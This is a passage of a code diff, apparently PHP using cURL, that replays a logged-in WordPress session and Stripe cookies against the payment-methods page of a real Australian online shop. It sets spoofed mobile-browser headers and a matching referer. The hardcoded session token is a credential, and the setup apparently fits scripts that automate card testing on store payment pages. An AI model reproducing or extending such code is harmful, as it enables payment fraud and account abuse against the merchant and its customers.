sbjs_session=pgs%3D24%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fhealthyfungi.com.au%2Fmy-account%2Fpayment-methods%2F',
+  CURLOPT_COOKIE => 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-11-08%2019%3A36%3A40%7C%7C%7Cep%3Dhttps%3A%2F%2Fhealthyfungi.com.au%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-11-08%2019%3A36%3A40%7C%7C%7Cep%3Dhttps%3A%2F%2Fhealthyfungi.com.au%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F130.0.0.0%20Mobile%20Safari%2F537.36; wordpress_logged_in_febd530ada708d5093f883308bac36a7=rg2004j%7C1732304472%7CpblBuEHjl1mFZlV6P65yKlAcq4U25lj3NmtqOf78qrz%7C7cf3e7871efb13634e7094dac3694c8fbd343128b0365673a9e938aeebea5f7f; __stripe_mid=53e89807-84e5-4a98-a6e5-1f91e51883aa844aaf; __stripe_sid=cc06746a-e59e-4944-b9a9-35894a6b552d4eb28c; sbjs_session=pgs%3D14%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fhealthyfungi.com.au%2Fmy-account%2Fpayment-methods%2F',
   CURLOPT_HTTPHEADER => [
     'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36',
+    'sec-ch-ua: "Chromium";v="130", "Brave";v="130", "Not?A_Brand";v="99"',
     'sec-ch-ua-platform: "Android"',
-    'accept-language: es-US,es;q=0.8',
+    'accept-language: es-US,es;q=0.6',
     'referer: https://healthyfungi.com.au/my-account/payment-methods/',
   ],
 ]);
